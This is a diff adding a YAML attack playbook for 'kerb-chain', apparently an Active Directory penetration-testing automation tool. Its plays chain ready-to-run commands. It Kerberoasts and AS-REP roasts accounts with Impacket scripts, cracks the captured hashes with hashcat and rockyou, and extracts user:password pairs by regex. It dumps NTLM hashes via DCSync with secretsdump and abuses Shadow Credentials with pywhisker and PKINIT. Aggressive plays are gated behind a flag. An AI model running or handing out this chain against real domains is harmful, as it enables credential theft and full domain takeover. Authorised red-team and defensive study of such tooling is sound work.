@@ -1,0 +1,175 @@
+# kerb-chain — standard AD attack playbook.
+#
+# Intended order is recon → safe-spray → exploit → loot. Plays with
+# `requires_aggressive: true` are skipped unless `--aggressive` is set.
+# All credentials live in the engagement's loot store; placeholders
+# `{{operator_user}}` / `{{operator_pass}}` resolve to the newest
+# credential captured (initially the seed cred from the CLI).
+#
+# Customise by copying this file and passing `--playbook ./my.yaml`.
+
+name: standard
+description: Default kerb-map → cracked-creds → DCSync chain.
+
+plays:
+
+  # ── 1. Kerberoast every Kerberoastable account ──────────────────────
+  - name: kerberoast-all
+    description: Request TGS for every account flagged Kerberoastable.
+    when: "loot.has_credential and finding.attack == 'Kerberoast'"
+    per: finding
+    command:
+      - GetUserSPNs.py
+      - "{{domain}}/{{operator_user}}:{{operator_pass}}"
+      - -dc-ip
+      - "{{dc_ip}}"
+      - -request-user
+      - "{{finding.target}}"
+      - -outputfile
+      - "{{run_dir}}/kerberoast.hash"
+    capture:
+      stdout_to_file: kerberoast-{{finding.target}}.log
+      files_glob: kerberoast.hash
+    on_success:
+      - crack-kerberoast-hashcat
+    category: kerberoast
+
+  # ── 2. Crack the captured TGS hashes offline ────────────────────────
+  - name: crack-kerberoast-hashcat
+    description: Hashcat mode 13100 against the captured Kerberoast hashes.
+    when: ""   # always — gated by the hash file existing on disk
+    command:
+      - hashcat
+      - -m
+      - "13100"
+      - "{{run_dir}}/kerberoast.hash"
+      - /usr/share/wordlists/rockyou.txt
+      - --quiet
+      - --potfile-path={{run_dir}}/hashcat.potfile
+    capture:
+      stdout_to_file: hashcat-output.log
+      # `hashcat --show` would emit user:pass — do that as a follow-up
+      # rather than parsing hashcat status here.
+    on_success:
+      - extract-cracked-creds
+    timeout: 1800
+    category: cracking
+
+  - name: extract-cracked-creds
+    description: Pull cracked principal:password pairs from the potfile.
+    when: ""
+    command:
+      - hashcat
+      - --show
+      - -m
+      - "13100"
+      - "{{run_dir}}/kerberoast.hash"
+      - --potfile-path={{run_dir}}/hashcat.potfile
+    capture:
+      cred_regex: '(?P<user>[^:\$]+)\$.*:(?P<pass>[^\s]+)$'
+    category: cracking
+
+  # ── 3. AS-REP roast (no credentials needed) ─────────────────────────
+  - name: asrep-roast
+    description: Request AS-REP for every DONT_REQUIRE_PREAUTH account.
+    when: "finding.attack == 'AS-REP Roast'"
+    per: finding
+    command:
+      - GetNPUsers.py
+      - "{{domain}}/{{finding.target}}"
+      - -no-pass
+      - -dc-ip
+      - "{{dc_ip}}"
+      - -outputfile
+      - "{{run_dir}}/asrep.hash"
+    capture:
+      files_glob: asrep.hash
+    on_success:
+      - crack-asrep-hashcat
+    category: asrep
+
+  - name: crack-asrep-hashcat
+    description: Hashcat mode 18200 against the AS-REP hashes.
+    when: ""
+    command:
+      - hashcat
+      - -m
+      - "18200"
+      - "{{run_dir}}/asrep.hash"
+      - /usr/share/wordlists/rockyou.txt
+      - --quiet
+      - --potfile-path={{run_dir}}/hashcat-asrep.potfile
+    capture:
+      stdout_to_file: hashcat-asrep.log
+    timeout: 1800
+    category: cracking
+
+  # ── 4. DCSync, when we hold a credential that has the rights ────────
+  - name: secretsdump-via-dcsync
+    description: Run secretsdump for every principal with full DCSync rights
+                 we already have credentials for.
+    when: "finding.attack == 'DCSync (full)' and loot.has_credential_for finding.target"
+    per: finding
+    command:
+      - secretsdump.py
+      - -just-dc-ntlm
+      - "{{domain}}/{{finding.target}}@{{dc_ip}}"
+    capture:
+      stdout_to_file: secretsdump-{{finding.target}}.log
+      cred_hash_regex: '^(?P<user>[^:]+):\d+:[a-f0-9]{32}:(?P<hash>[a-f0-9]{32}):::$'
+    requires_aggressive: true
+    category: dcsync
+
+  # ── 5. Shadow Credentials — attach a key, get the hash ──────────────
+  - name: pywhisker-attach-key
+    description: For Shadow Creds (write access) findings, attach a key to
+                 the target and request a PKINIT TGT.
+    when: "finding.attack == 'Shadow Credentials (write access)' and loot.has_credential"
+    per: finding
+    command:
+      - pywhisker.py
+      - -d
+      - "{{domain}}"
+      - -u
+      - "{{operator_user}}"
+      - -p
+      - "{{operator_pass}}"
+      - --target
+      - "{{finding.target}}"
+      - --action
+      - add
+      - --filename
+      - "{{run_dir}}/{{finding.target}}"
+    capture:
+      stdout_to_file: pywhisker-{{finding.target}}.log
+      files_glob: "{{finding.target}}.pfx"
+    on_success:
+      - gettgtpkinit-with-cert
+    requires_aggressive: true
+    category: shadow-credentials
+
+  - name: gettgtpkinit-with-cert
+    description: Use the freshly-attached key to PKINIT for the target's TGT.
+    when: ""
+    command:
+      - gettgtpkinit.py
+      - -cert-pfx
+      - "{{run_dir}}/{{finding.target}}.pfx"
+      - "{{domain}}/{{finding.target}}"
+      - "{{run_dir}}/{{finding.target}}.ccache"
+    capture:
+      stdout_to_file: gettgt-{{finding.target}}.log
+    requires_aggressive: true
+    category: shadow-credentials
+
+  # ── 6. BadSuccessor — only ever surface, never auto-execute ─────────
+  - name: badsuccessor-warn
+    description: Print a loud notice for any staged BadSuccessor finding —
+                 these are CRITICAL and the operator must verify before any
+                 action; we deliberately do NOT auto-execute the dMSA chain.
+    when: "finding.attack == 'BadSuccessor (staged)'"
+    per: finding
+    command:
+      - "echo"
+      - "CRITICAL — staged BadSuccessor on {{finding.target}}; manual review required."
+    category: badsuccessor
